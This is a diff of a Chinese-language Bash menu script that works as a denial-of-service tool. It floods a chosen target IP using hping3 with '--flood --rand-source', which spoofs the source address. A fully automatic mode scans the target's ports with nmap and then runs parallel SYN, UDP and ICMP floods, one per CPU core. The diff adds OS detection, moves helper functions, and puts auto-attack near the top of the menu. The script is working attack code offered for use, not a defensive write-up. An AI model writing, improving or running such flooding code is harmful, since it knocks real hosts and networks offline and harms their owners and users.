@@ -2,16 +2,21 @@
 export LANG=en_US.UTF-8
 
 # 全局变量
+# 目标 IP 配置文件路径
 TARGET_IP_FILE="$HOME/target_ip.conf"
 TARGET_IP=""
 CONCURRENT_ATTACKS=0
 
 # 初始化函数
 initself() {
-    selfversion='0.1'
+    selfversion='0.2'
     datevar=$(date +%Y-%m-%d_%H:%M:%S)
     menuname='首页'
     parentfun=''
+    installType='apt -y install'
+    removeType='apt -y remove'
+    upgrade="apt -y update"
+    release='linux'
 
     # 颜色定义
     _red() {
@@ -30,7 +35,6 @@ initself() {
         printf '\033[0;31;36m%b\033[0m' "$1"
         echo
     }
-
 
     # 等待输入
     waitinput() {
@@ -65,26 +69,76 @@ initself() {
         echo
     }
 
+    #检查系统
+    checkSystem() {
+        if [[ -n $(find /etc -name "redhat-release") ]] || grep </proc/version -q -i "centos"; then
+            release="centos"
+            installType='yum -y install'
+            removeType='yum -y remove'
+            upgrade="yum update -y --skip-broken"
+        elif [[ -f "/etc/issue" ]] && grep </etc/issue -q -i "debian" || [[ -f "/proc/version" ]] && grep </etc/issue -q -i "debian" || [[ -f "/etc/os-release" ]] && grep </etc/os-release -q -i "ID=debian"; then
+            release="debian"
+            installType='apt -y install'
+            upgrade="apt update"
+            removeType='apt -y autoremove'
+        elif [[ -f "/etc/issue" ]] && grep </etc/issue -q -i "ubuntu" || [[ -f "/proc/version" ]] && grep </etc/issue -q -i "ubuntu"; then
+            release="ubuntu"
+            installType='apt -y install'
+            upgrade="apt update"
+            removeType='apt -y autoremove'
+        elif [[ -f "/etc/issue" ]] && grep </etc/issue -q -i "Alpine" || [[ -f "/proc/version" ]] && grep </proc/version -q -i "Alpine"; then
+            release="alpine"
+            installType='apk add'
+            upgrade="apk update"
+            removeType='apt del'
+        fi
+
+        if [[ -z ${release} ]]; then
+            echoContent red "\n不支持此系统\n"
+            _red "$(cat /etc/issue)"
+            _red "$(cat /proc/version)"
+            exit 0
+        fi
+    }
+
     # 检查依赖
     check_deps() {
         local deps=("hping3" "nmap" "curl")
         for dep in "${deps[@]}"; do
             if ! command -v "$dep" &>/dev/null; then
                 _yellow "$dep 未安装，正在安装..."
-                apt update && apt install "$dep" -y
+                ${upgrade} && ${installType} "$dep"
             fi
         done
+    }
+
+    # 加载目标 IP
+    load_target_ip() {
+        if [[ -f "$TARGET_IP_FILE" ]]; then
+            TARGET_IP=$(cat "$TARGET_IP_FILE")
+        fi
+    }
+
+    # 清理函数
+    cleanup() {
+        _yellow "清理中，杀掉所有子进程..."
+        pkill -P $$ # 杀掉当前脚本的所有子进程
     }
 
     # 菜单头部
     menutop() {
         clear
-        _yellow '                          ┌──►   '
-        _yellow '─────────────────────#────┼────► '
-        _yellow '                          └──►   '
-        _blue "v: $selfversion"
+        _yellow ' 黄金十三戟                 ┌──►   '
+        _yellow '─────────────────────────#──┼────► '
+        _yellow '                            └──►   ' 
+        echo "v: $selfversion"
+        if [[ -n "$TARGET_IP" ]]; then
         echo
-        _yellow "当前菜单: $menuname "
+        _yellow "目标 IP: $TARGET_IP"
+        fi
+        
+        echo
+        _blue "当前菜单: $menuname "
         echo
     }
 
@@ -128,36 +182,23 @@ initself() {
             ;;
         esac
     }
+    # 检查系统
+    checkSystem
+    # 检查依赖
+    check_deps
+    # 加载目标 IP
     load_target_ip
-    trap cleanup EXIT # 脚本退出时清理
+    # 获取 CPU 核心数
+    CONCURRENT_ATTACKS=$(nproc)
+    # 脚本退出时清理
+    trap cleanup EXIT
 }
 
-# 加载目标 IP
-load_target_ip() {
-    if [[ -f "$TARGET_IP_FILE" ]]; then
-        TARGET_IP=$(cat "$TARGET_IP_FILE")
-        _green "加载目标 IP: $TARGET_IP"
-    fi
-}
-
-# 保存目标 IP
-save_target_ip() {
-    echo "$TARGET_IP" >"$TARGET_IP_FILE"
-    jumpfun "目标 IP 已保存到 $TARGET_IP_FILE"
-}
-
-# 清理函数
-cleanup() {
-    _yellow "清理中，杀掉所有并发进程..."
-    pkill -P $$ # 杀掉当前脚本的所有子进程
-    jumpfun "清理完成"
-}
-
-
-# 配置被攻击 IP
+# 配置目标 IP
 configure_target_ip() {
     read -ep "请输入目标 IP: " TARGET_IP
-    save_target_ip
+    echo "$TARGET_IP" >"$TARGET_IP_FILE"
+    _green "目标 IP 已保存到 $TARGET_IP_FILE"
 }
 
 # 执行攻击的通用函数
@@ -181,8 +222,7 @@ execute_attack() {
         hping3 -c $((duration * 1000)) -d "$packet_size" $attack_flag -p "$target_port" --flood --rand-source "$target_ip" &
     fi
 }
-
-# 手动攻击模式
+# 手动攻击
 hping3_attack() {
     menuname="HPING3攻击"
 
@@ -191,9 +231,8 @@ hping3_attack() {
         local attack_flag=$2
 
         if [[ -z "$TARGET_IP" ]]; then
-            _red "请先配置目标 IP"
-            waitinput
-            return
+            _yellow "配置目标 IP"
+            configure_target_ip
         fi
 
         read -ep "数据包大小(默认120): " packet_size
@@ -223,15 +262,13 @@ hping3_attack() {
     menu "${options[@]}"
 }
 
-# 全自动攻击模式
+# 全自动攻击
 auto_attack() {
     menuname="全自动攻击"
 
     if [[ -z "$TARGET_IP" ]]; then
-        _red "请先配置目标 IP"
-        waitinput
-        main
-        return
+        _yellow "配置目标 IP"
+        configure_target_ip
     fi
 
     _yellow "开始扫描目标的常用端口..."
@@ -249,7 +286,6 @@ auto_attack() {
         attack_types+=("ICMP" "--icmp" "")
     fi
 
-    CONCURRENT_ATTACKS=$(nproc) # 获取 CPU 核心数
     _yellow "根据 CPU 核心数并发执行攻击: $CONCURRENT_ATTACKS"
 
     for ((i = 0; i < ${#attack_types[@]}; i += 3)); do
@@ -259,7 +295,7 @@ auto_attack() {
 
         _yellow "执行 $attack_type 攻击..."
         execute_attack "$attack_type" "$attack_flag" "$TARGET_IP" "$target_port" 120 60
-        
+
         # 控制并发数
         while [[ $(jobs -r | wc -l) -ge $CONCURRENT_ATTACKS ]]; do
             sleep 1
@@ -298,12 +334,11 @@ nmap_scan() {
 # 主菜单
 main() {
     menuname='首页'
-    check_deps
     options=(
         "配置目标 IP" configure_target_ip
+        "全自动攻击" auto_attack
         "HPING3攻击" hping3_attack
         "NMAP扫描" nmap_scan
-        "全自动攻击" auto_attack
     )
     menu "${options[@]}"
 }
